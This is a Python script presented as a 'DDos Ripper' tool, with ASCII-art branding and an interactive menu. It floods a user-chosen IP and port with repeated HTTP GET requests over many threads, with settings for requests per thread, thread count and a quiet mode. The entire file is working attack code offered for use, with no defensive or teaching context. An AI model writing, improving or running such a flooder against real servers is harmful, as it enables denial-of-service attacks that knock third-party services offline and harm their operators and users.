print("\033[31m" + r"""
                        @         @
                         @         @
                     @   @         @   @
                     @  @@         @@  @
                     @@ @@@       @@@ @@
             @      @@   @@@     @@@   @@      @
            @@      @@   @@@     @@@   @@      @@
           @@      @@    @@@@   @@@@    @@      @@
           @@     @@@    @@@@  @@@@@    @@@     @@@
       @  @@@    @@@@    @@@@   @@@@    @@@@   @@@@  @
       @@ @@@@@  @@@@   @@@@@   @@@@@   @@@@  @@@@@ @@
       @@ @@@@@  @@@@@@@@@@@     @@@@@@@@@@@  @@@@@ @@
       @@ @@@@@  @@@@@@@@@@@     @@@@@@@@@@@  @@@@@ @@
      @@@  @@@@   @@@@@@@@@@@@@@@@@@@@@@@@@   @@@@  @@@
     @@@@  @@@@   @@@@@@@@@@@@@@@@@@@@@@@@@   @@@@  @@@@
    @@@@   @@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@   @@@@
   @@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@
   @@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@           @@@@@@@@@@@@@@@@@@@           @@@@@
     @@@@@@             @@@@@@@@@@@@@             @@@@@@
      @@@@@@@        ..     @@@@@@@@@     ..        @@@@@@
       @@@@@@@@             @@@@@             @@@@@@@@
        @@@@@@@@@@           @@@           @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
              @@@@@@@@@@@@@@@   @@@@@@@@@@@@@@@
                  @@@@@@@@@@     @@@@@@@@@@
                   @@@@@@@@       @@@@@@@@
                  @@@@@@@@@       @@@@@@@@@
                  @@@@@@@@@ @@@@@ @@@@@@@@@
                 @@@@@@@@@@@@@@@@@@@@@@@@@@@
                 @@@  @@@@@@@@@@@@@@@@@  @@@
                  @@  @@@@  @@@@@  @@@@  @@
                      @@@@  @@@@@  @@@@
""" + "\033[0m")

import socket
import threading
import sys

# Definição das cores
YELLOW_BRIGHT = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

def attack(target_ip, target_port, turbo, quiet):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('utf-8')
        for _ in range(turbo):
            sock.send(message)
        if not quiet:
            print(f"{MAGENTA}Attack sent to {target_ip}:{target_port}{RESET}")
    except Exception as e:
        if not quiet:
            print(f"{MAGENTA}Failed to attack {target_ip}:{target_port} — {e}{RESET}")
    finally:
        if sock:
            sock.close()

def main_menu():
    target_ip = ""
    target_port = 80
    turbo = 135
    threads_num = 10
    quiet = False

    try:
        while True:
            print()
            print(f"{YELLOW_BRIGHT}--- DDos Ripper Menu ---{RESET}")
            print(f"{GREEN}1.{RESET} Set target IP {CYAN}(current: {target_ip}){RESET}")
            print(f"{GREEN}2.{RESET} Set target port {CYAN}(current: {target_port}){RESET}")
            print(f"{GREEN}3.{RESET} Set turbo (requests per thread) {CYAN}(current: {turbo}){RESET}")
            print(f"{GREEN}4.{RESET} Set number of threads {CYAN}(current: {threads_num}){RESET}")
            print(f"{GREEN}5.{RESET} Toggle quiet mode {CYAN}(current: {'ON' if quiet else 'OFF'}){RESET}")
            print(f"{GREEN}6.{RESET} Start attack")
            print(f"{GREEN}7.{RESET} Exit")

            choice = input(f"{YELLOW_BRIGHT}Choose an option (1-7): {RESET}")

            if choice == "1":
                target_ip = input(f"{YELLOW_BRIGHT}Enter target IP: {RESET}").strip()
            elif choice == "2":
                try:
                    target_port = int(input(f"{YELLOW_BRIGHT}Enter target port: {RESET}").strip())
                except ValueError:
                    print(f"{MAGENTA}Invalid port number!{RESET}")
            elif choice == "3":
                try:
                    turbo = int(input(f"{YELLOW_BRIGHT}Enter turbo (requests per thread): {RESET}").strip())
                except ValueError:
                    print(f"{MAGENTA}Invalid number!{RESET}")
            elif choice == "4":
                try:
                    threads_num = int(input(f"{YELLOW_BRIGHT}Enter number of threads: {RESET}").strip())
                except ValueError:
                    print(f"{MAGENTA}Invalid number!{RESET}")
            elif choice == "5":
                quiet = not quiet
                print(f"{MAGENTA}Quiet mode set to {'ON' if quiet else 'OFF'}.{RESET}")
            elif choice == "6":
                if target_ip == "":
                    print(f"{MAGENTA}Target IP is not set!{RESET}")
                    continue

                print(f"{MAGENTA}Starting attack on {target_ip}:{target_port} with turbo {turbo} and {threads_num} threads...{RESET}")
                threads = []
                for _ in range(threads_num):
                    t = threading.Thread(target=attack, args=(target_ip, target_port, turbo, quiet), daemon=True)
                    t.start()
                    threads.append(t)

                for t in threads:
                    t.join()

                print(f"{MAGENTA}Attack completed.{RESET}")
            elif choice == "7":
                print(f"{MAGENTA}Exiting.{RESET}")
                sys.exit()
            else:
                print(f"{MAGENTA}Invalid option. Try again.{RESET}")
    except KeyboardInterrupt:
        print(f"\n{MAGENTA}Program interrupted by user. Exiting.{RESET}")

if __name__ == "__main__":
    main_menu()
